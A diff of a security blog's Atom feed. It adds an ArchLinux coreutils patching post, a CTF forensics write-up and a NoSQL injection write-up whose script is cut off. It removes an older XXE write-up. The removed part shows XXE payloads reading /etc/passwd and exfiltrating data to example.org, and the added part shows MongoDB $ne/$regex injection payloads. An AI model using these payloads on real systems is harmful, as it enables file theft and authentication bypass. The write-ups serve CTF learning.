@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://rawsec.ml/"/>
-  <updated>2016-11-07T22:33:36.955Z</updated>
+  <updated>2016-11-13T16:49:39.147Z</updated>
   <id>http://rawsec.ml/</id>
   
   <author>
@@ -14,6 +14,52 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ArchLinux - Monitor copy progression with Advanced Copy patch</title>
+    <link href="http://rawsec.ml/en/archlinux-monitor-copy-progression-with-advanced-copy-patch/"/>
+    <id>http://rawsec.ml/en/archlinux-monitor-copy-progression-with-advanced-copy-patch/</id>
+    <published>2016-11-12T23:00:00.000Z</published>
+    <updated>2016-11-13T16:49:39.147Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://web.archive.org/web/20131115171331/http://beatex.org/web/advcopy/advcpmv-screen-20130313.png" alt="advcpmv"></p>
+<blockquote>
+<p>Advanced Copy is a mod for the GNU cp and GNU mv tools which adds a progress bar and provides some info on what’s going on.</p>
+</blockquote>
+<p>It was written by Florian Zwicke and released under the GPL.</p>
+<p>Original website (<a href="http://beatex.org/web/advancedcopy.html" target="_blank" rel="external">http://beatex.org/web/advancedcopy.html</a>) is dead but a backup git repository exist (<a href="https://github.com/atdt/advcpmv" target="_blank" rel="external">https://github.com/atdt/advcpmv</a>).</p>
+<h2 id="Compile-from-sources"><a href="#Compile-from-sources" class="headerlink" title="Compile from sources"></a>Compile from sources</h2><p>You will need <a href="https://www.archlinux.org/packages/core/x86_64/gcc/" target="_blank" rel="external">gcc</a>, <a href="https://www.archlinux.org/packages/core/x86_64/make/" target="_blank" rel="external">make</a> and <a href="https://www.archlinux.org/packages/core/x86_64/patch/" target="_blank" rel="external">patch</a>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.21.tar.xz</div><div class="line">$ tar xvJf coreutils-8.21.tar.xz</div><div class="line">$ cd coreutils-8.21/</div><div class="line">$ wget https://raw.githubusercontent.com/atdt/advcpmv/master/advcpmv-0.5-8.21.patch</div><div class="line">$ patch -p1 -i advcpmv-0.5-8.21.patch</div><div class="line">$ ./configure</div><div class="line">$ make</div></pre></td></tr></table></figure>
+<p>The new programs are now located in src/cp and src/mv. Place them somewhere else:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo cp src/cp /usr/local/bin/cp</div><div class="line">$ sudo cp src/mv /usr/local/bin/mv</div></pre></td></tr></table></figure>
+<p>You can make some aliases, for example:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alias cpa=&apos;/usr/local/bin/cp -g&apos;</div><div class="line">alias mva=&apos;/usr/local/bin/mv -g&apos;</div></pre></td></tr></table></figure>
+<p>You may want this aliases to be permanent so place them in your <code>~/.zshrc</code> (or <code>~/.bashrc</code>) or create a profile script containing the two previous aliases:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/profile.d/alias-advcpmv.sh</div></pre></td></tr></table></figure>
+<p>And then create another profile script for <code>sudo</code> otherwise you won’t be able to call the previous aliases with <code>sudo</code>.<br>To be able to pass aliases to <code>sudo</code> create the following file:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/profile.d/alias-sudo.sh</div></pre></td></tr></table></figure>
+<p>Containing:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alias sudo=&apos;sudo &apos;</div><div class="line"># whitespace ---^</div></pre></td></tr></table></figure>
+<h2 id="Running"><a href="#Running" class="headerlink" title="Running"></a>Running</h2><p>Now when using <code>cpa</code>, <code>sudo cpa -rn</code>, etc… you will use <code>/usr/local/bin/cp -g</code>, <code>sudo /usr/local/bin/cp -grn</code>, etc…</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://web.archive.org/web/20131115171331/http://beatex.org/web/advcopy/advcpmv-screen-20130313.png&quot; alt=&quot;advcpmv&quot;&gt;&lt;/p&gt;
+&lt;block
+    
+    </summary>
+    
+      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
+    
+      <category term="archlinux" scheme="http://rawsec.ml/categories/linux/archlinux/"/>
+    
+    
+      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
+    
+      <category term="archlinux" scheme="http://rawsec.ml/tags/archlinux/"/>
+    
+  </entry>
   
   <entry>
     <title>School CTF - 100 - n4M3 - Forensics</title>
@@ -146,11 +192,11 @@
   </entry>
   
   <entry>
-    <title>ECW - 150 - Carnet d&#39;adresses - Web</title>
-    <link href="http://rawsec.ml/en/ECW-2016-carnet-dadresse/"/>
-    <id>http://rawsec.ml/en/ECW-2016-carnet-dadresse/</id>
+    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
+    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
+    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
     <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:45:06.257Z</updated>
+    <updated>2016-11-07T21:44:43.303Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -175,38 +221,87 @@
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
-<p><a href="https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/" target="_blank" rel="external">xxe</a></p>
-<p>We are given the following form:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>And the following answer confirming the well formated XML request:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure>
-<p>We should be able to leak data into the answer banner.</p>
-<p>Confirmation that entities are interpreted:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure>
-<p>Nice that’s working so try to leak some files:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<p>[…] and we tried a lot of logical filename on various operating systems.</p>
-<p>But how did we find out the right? The challenge required no logic but only guessing …</p>
-<p>I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure>
-<p><code>xxe_file</code>:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
-<p>And a tried a lot…</p>
-<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn’t mention any convention.</p>
-<p>I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.</p>
-<p>Realistic challenge should have be better.</p>
-<p>But indeed some people find it realy easily as <code>flag.txt</code> can be common in CTF.</p>
-<p>I insist on the fact that’s is only CTF guessing, in real life this never occurs.</p>
-<p>Here was the easy XXE :</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
+<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
+<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
+<p>Its content is:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
+<p>So we need to find Windows registry and browse it.</p>
+<blockquote>
+<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
+</blockquote>
+<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
+<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
+<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
+<p><strong>Bonus</strong>:</p>
+<ul>
+<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
+<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ECW - 100 - Pas seulement BSON - Web</title>
+    <link href="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/"/>
+    <id>http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/</id>
+    <published>2016-11-05T23:00:00.000Z</published>
+    <updated>2016-11-07T21:44:57.227Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
+<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy - Student</li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="external">NoSQL injection</a> on the famous <a href="https://www.mongodb.com/" target="_blank" rel="external">MongoDB</a> with certain <a href="http://www.php.net/manual/en/mongo.security.php" target="_blank" rel="external">PHP</a> at backend.</p>
+<p>We used the <a href="queryOperator">query operators</a> to perform the NoSQLi.</p>
+<p>We tested the following payload in our script with the <a href="https://docs.mongodb.com/manual/reference/operator/query/ne/#op._S_ne" target="_blank" rel="external">ne</a> query operator to confirm presence of the vulnerability:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password[$ne]=nosql&amp;nonce=myNonce</div></pre></td></tr></table></figure>
+<p>Then we retrieved the password letter by letter with the <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex" target="_blank" rel="external">regex</a> query operator of NoSQL.<br>At the beginning the script uses the following paylods:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
+<p>Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
+<p>So here is our script that we adapted from the first web challenge <em>Authentification</em>.</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span 